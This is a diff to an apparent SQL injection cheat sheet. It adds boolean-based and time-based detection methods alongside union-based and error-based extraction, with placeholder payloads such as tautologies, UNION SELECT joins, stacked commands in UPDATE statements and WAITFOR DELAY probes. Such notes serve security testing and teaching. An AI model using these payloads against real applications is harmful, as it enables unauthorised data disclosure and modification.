@@ -52,14 +52,25 @@ xxx';<commands>;--    #DANGEROUS! Hides the WHERE clause, all info fields in tab
 yyy';<commands>;--    #update statement completes normally, then the injected commands will be executed
 ```
 
-## Data disclosure
+## Techniques
 
-### Union based data disclosure
+### Boolean based
+
+Execute a query containing a valid parameter (such as an item ID) and concatenate to the instruction a comparison statement that will always be true or false.
+
+```
+<param>' and 1=1;    #returns the item matching <param>
+<param>' and 1=0;    #returns nothing
+```
+
+If the first statement returns the expected value and the second statement returns nothing then the field or parameter are vulnerable
+
+### Union based
 
 1. Find the number of columns: `' or 1=1 order by <col number>; --` increase the number of columns until you get an error. Pay also attention to how the output is ordered, this allows you to match a column number to its output field.
 2. Join data: `' or 1=1 union all select <fields> from <table>; --` since the UNION operation requires that both tables have the same column number, add NULL values for the missing columns in the select if the operation fails.
 
-### Time based boolean check
+### Time based
 
 Execute a query that results in a boolean statement (true/false). Use a time delay command to stop execution if the result is True. Useful to display boolean values since error based data disclosure doesn't work with them.
 
@@ -67,7 +78,13 @@ Execute a query that results in a boolean statement (true/false). Use a time del
 ');if (IS_MEMBER ('db_owner') = 0) WAITFOR DELAY '0:0:5';--
 ```
 
-### Error based data disclosure
+This technique can also be used to verity the existence of an SQL injection vulnerability in the same way as the Boolean attack. If the application freezes for the given amount of time after executing the query then the field or parameter are vulnerable
+
+```
+<value>'; WAITFOR DELAY '0:0:5'; --
+```
+
+### Error based
 
 If the field you're injecting is not used to display data it is possible to make the database print data by causing a cast error i.e. casting strings to integers. This allows you to read one value in a table at time, to print more values filter by row number.
 
